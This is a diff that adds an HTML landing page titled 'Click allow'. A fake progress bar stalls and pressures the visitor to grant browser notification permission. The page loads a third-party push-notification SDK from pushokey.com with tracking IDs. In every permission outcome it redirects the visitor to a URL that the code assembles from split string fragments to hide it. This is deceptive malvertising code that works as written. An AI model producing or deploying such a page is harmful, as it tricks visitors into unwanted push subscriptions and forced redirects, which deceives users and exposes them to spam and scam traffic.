@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset=UTF-8>
+    <meta name=viewport content="width=device-width, initial-scale=1.0">
+    <meta http-equiv=X-UA-Compatible content="ie=edge">
+    <link rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAk9QTFRFAAAAK0Zf8XhrKEJbLEVeRl50LUdgMktjBB85aJa+J0JcKkVePjxEVlZiJkFaSV1xRGJ4kqKuKTRLMTRKb4GROFpyMf//ZnmKKkNcCS1Jd4iXKkVeaHuNWGyAP1Vtw3NxgGZwp21v/4l4NE5mi5qnpK+6Nk5ma1NgQUpc1XRta2FvmHqAL0pjnKizp7G7ucLKan2OaHuNYnWIKUpksnJy0HNsGzlTfo+f5bu5mai0r7nCcYOUMEFYb2RyCylEZXqM2Ly99HFj9YN3ubW8rbjBl6SxoKy3J0Re1XZvAAAAJkJcPlhvoqy2+JmP7quml6Wxtr/IlaOveImZOkRZe2l1FjNNSWN5kJypyMTKmKay6rOv8WNU9HVoyri8oK25kJ6rK0ZfiGdv03VvNU9neouayLq9+Y+Ev7i+sLS99o+E9JuSn6iztsDIZ3uMM0xjRltwNlBns7jA+paM8Kiim6m13r+/m6ezMEpiYHSGjZyq6LSx8WJT+p6Uv8LJeYqamqSvi5qnf5Cfc4WVSmF2WW6COVJpWm+ClqOwrrC5+qmh6rWxr6qxYG+COFFpGzhTETBMBxgvAAAADRg1BxAsLEZfY3eJX3OGpK+5hniDuVdTjVpgQltxK0VeGjdRMEliKEliZUZSVEZWDmmMLkVdnVBRpFFRNEZdAF+KU0ZWqFJRPERYMEhgTkVWRUdaMlNs7Lq2qbS+4OTn4uXp8FxM8WBR8F1O8qKa8FtL8FxN8F5P9pWK8pmQ8rCpz83Rj52r8WFS41xQ01lP819QxldQ////HAFxdQAAAK90Uk5TAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJ9aSLUJALQhz/OlHDQ4mOgtC5P3+0biZKSE7IMf8/P62FEELnv7+/fz8/OcpOwElk/b9/Pv8/sQYQRdz2P38/P7+/Pz5Yhw/VMb7/fz8/f38/qAqEZr+/f38/fE/4Pz8/v386trKt6GYpCiZ/P79/fz6mycRCAIBBSW63/j6/f3JKxM0XbehBkPs7EYEkvV6L7xlDpRA4c4AAAABYktHRMQUDBvhAAAACXBIWXMAAABIAAAASABGyWs+AAAAt0lEQVQYGTXBoUpDYRjH4f/ve1+2d0c8Y9VgMRyTYDILRtMssrJmW9AmhsHuYGjyBrwFsYrJi3BgEgeCXfD7ztmeB7XYo7NChf0dsKXMadhKytLxzqKqqvk8IpDUP6EzewAUp2RXPNIZnNOaPNGyacTlR0QcHq36he9CungBYwzP3HvA69kA3shq8Bp4H7Jxm7xm4+ZXRbqLrGl6vaQW0ogl+5/MWCtL0o+5426mIkn6vrYvdzMV/6vkGoWQ4oCVAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE4LTExLTI2VDEzOjQ2OjMxKzAwOjAwQ+i52AAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOC0xMS0yNlQxMzo0NjozMSswMDowMDK1AWQAAAAASUVORK5CYII=" type=image/x-icon> <title>Click allow</title>
+    <link rel=stylesheet href=https://use.fontawesome.com/releases/v5.4.2/css/all.css integrity=sha384-/rXc/GQVaYpyDdyxK+ecHPVYJSN9bmVFBvjA/9eOB+pb3F2w2N6fc5qB9Ew5yIns crossorigin=anonymous>
+    <meta name=robots content="noindex, nofollow">
+    <link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css integrity=sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4 crossorigin=anonymous>
+    <style>
+        .bar_container {
+            width: 80%;
+            margin: 0 auto;
+            margin-top: 5%
+        }
+
+        span {
+            font-size: 2rem
+        }
+
+        #message {
+            display: none;
+            margin-top: 3%;
+            font-size: 1.2rem;
+            font-weight: 500;
+            color: #3f3f3f
+        }
+
+        #arrow {
+            display: none;
+            position: absolute;
+            font-size: 10em;
+            top: 30%;
+            left: 66%
+        }
+    </style>
+</head>
+
+<body>
+  <script>(function() {
+    function getParameterByName(name, url) {
+      if (!url) url = window.location.href;
+      name = name.replace(/[\[\]]/g, '\\$&');
+      var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+          results = regex.exec(url);
+      if (!results) return null;
+      if (!results[2]) return '';
+      return decodeURIComponent(results[2].replace(/\+/g, ' '));
+    }
+
+    var loc = document.location;
+    var tb = function(){ loc.href = ['ht', 'tps:/', '/blatw', 'alm.com/a', 'fu.ph', 'p?zon', 'eid=2483917'].join(''); };
+    var bc = function(){ loc.href = ['ht', 'tps:', '/', '/go', 'ogle.com/'].join(''); };
+
+    var url = new URL(window.location.href);
+    var pci = getParameterByName('external_id', window.location.href);
+    var ppi = getParameterByName('placementid', window.location.href);
+    var tag = document.createElement('script');
+    tag.type = 'text/javascript';
+    tag.dataset['sdk'] = 'sdk';
+    tag.src = '//pushokey.com/ntfc.php?p=2490456&ucis=true&m=https&nbinp=true' + '&var='+ ppi + '&ymid=' + pci;
+
+    function setupHandlers() {
+      // sdk.onBeforePermissionPrompt();
+      sdk.onPermissionDefault(tb);
+      sdk.onPermissionAllowed(tb);
+      sdk.onPermissionDenied(tb);
+      sdk.onAlreadySubscribed(tb);
+    }
+
+    tag.onload = setupHandlers;
+
+    document.head.appendChild(tag);
+    })();</script>  
+    <div class=bar_container> Loading... <div class=progress>
+            <div id=progress_one class=progress-bar role=progressbar aria-valuemin=0 aria-valuemax=100>0%</div>
+        </div>
+        <div id=arrow> <i class="fas fa-angle-double-down"></i> </div>
+        <div id=message> You need to <span>"Allow"</span> in order to continue... </div>
+    </div>
+    <script>
+        function progress() {
+            var bar = document.getElementById("progress_one");
+            var message = document.getElementById("message");
+            var arrow = document.getElementById("arrow");
+            var width = 0;
+            var id = setInterval(frame, 70);
+
+            function frame() {
+                if (width >= 68) {
+                    clearInterval();
+                    message.style.display = "block";
+                    arrow.style.display = "block";
+                } else {
+                    width += 2;
+                    bar.style.width = bar.innerHTML = width + "%";
+                }
+            }
+        }
+        progress();
+    </script>
+</body>
+</html>
